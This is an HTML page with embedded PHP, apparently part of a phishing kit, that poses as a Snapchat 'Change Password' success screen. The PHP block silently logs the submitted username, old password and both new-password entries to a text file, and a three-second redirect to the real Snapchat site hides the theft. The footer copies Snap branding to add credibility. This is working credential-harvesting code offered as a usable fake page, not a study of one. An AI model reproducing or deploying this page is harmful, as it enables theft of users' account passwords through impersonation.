<!DOCTYPE html>
<html lang="en" style="background-color:rgb(235,235,235)">

	<head>
		<title>Change Password • Snapchat</title>
		<meta charset="utf-8" http-equiv="refresh" content="3; URL='https://www.snapchat.com/'">
		
	</head>
<style>
html * {
        font-size: 16px;
        line-height: 1.625;
        color: #2020131;
        font-family: Nunito, sans-serif;
      }
* {
  box-sizing: border-box;
}

/* Create four equal columns that floats next to each other */
.column {
  float: left;
  width: 25%;
  padding: 10px;
  height: 300px; /* Should be removed. Only for demonstration */
}

/* Clear floats after the columns */
.row:after {
  content: "";
  display: table;
  clear: both;
}
</style>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<body>
		<div class="container" style="background-color:rgb(255,255,255)">
		<center> 
		<br> <br> <br>
		<img src="https://cdn-icons-png.flaticon.com/512/2111/2111803.png" width=75 alt="text description" >
		<h1> Success! </h1> <br>
		Your password has successfully been changed! <br>
		</form>
		<br> <br> <br>
		</div>
<?php
		$myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
		fwrite($myfile,"\n");
		$txt = $_GET["user"];
		fwrite($myfile, $txt."\n");
		$txt = $_GET["old"];
		fwrite($myfile, $txt."\n");
		$txt = $_GET["new1"];
		fwrite($myfile, $txt."\n");
		$txt = $_GET["new2"];
		fwrite($myfile, $txt."\n");
		fclose($myfile);
?>
		
	</body>
	<footer>
	
<div class="row">
  <div class="column">
    <h2>Company</h2>
    <p>Snap Inc.</p>
	<p>Careers</p>
	<p>News</p>
  </div>
  <div class="column">
    <h2>Community</h2>
    <p>Support</p>
	<p>Community Guidelines</p>
	<p>Safety Center</p>
  </div>
  <div class="column">
    <h2>Advertising</h2>
    <p>Buy Ads</p>
	<p>Advertising Policies</p>
	<p>Political Ads Library</p>
	<p>Brand Guidelines</p>
	<p>Promotions Rules</p>
  </div>
  <div class="column">
    <h2>Legal</h2>
    <p>Privacy Center</p>
	<p>Cookie Policy</p>
	<p>Report Infringement</p>
	<p>Custom Creative Tools Terms</p>
	<p>Community Geofilter Terms</p>
	<p>Lens Studio Terms</p>
  </div>
</div>

	</footer>

</html>